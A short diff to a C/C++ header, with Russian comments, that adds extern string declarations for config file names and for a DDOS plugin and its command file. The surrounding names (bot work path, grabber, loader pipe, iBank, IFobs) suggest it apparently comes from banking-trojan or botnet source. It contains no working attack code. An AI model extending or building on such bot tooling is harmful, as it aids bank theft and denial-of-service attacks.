@@ -59,6 +59,11 @@ extern CSSTR StrBotWorkPath[];
 extern CSSTR StrGrabberPath[];
 
 
+extern CSSTR EStrConfigFileName[]; // Имя файла хранения конфига
+extern CSSTR EStrConfigHPFileName[]; // Имя файла хранения конфига повышенного приоритета
+
+
+
 // Имена служебный пайпов
 extern CSSTR EStrPipeLoader[]; // Имя служебного пайпа лоадера
 
@@ -126,6 +131,13 @@ extern CSSTR EStrIBankFileName[];
 
 //файл-флаг копирование папки клиента IFobs
 extern CSSTR IFobsFlagCopy[];
+
+
+	// Имя плагина DDOS
+extern CSSTR EStrDDOSPlugin[];
+
+// Имя файла данных для команды DDOS
+extern CSSTR EStrDDOSSignal[];
 
 
 //*********************************************************************
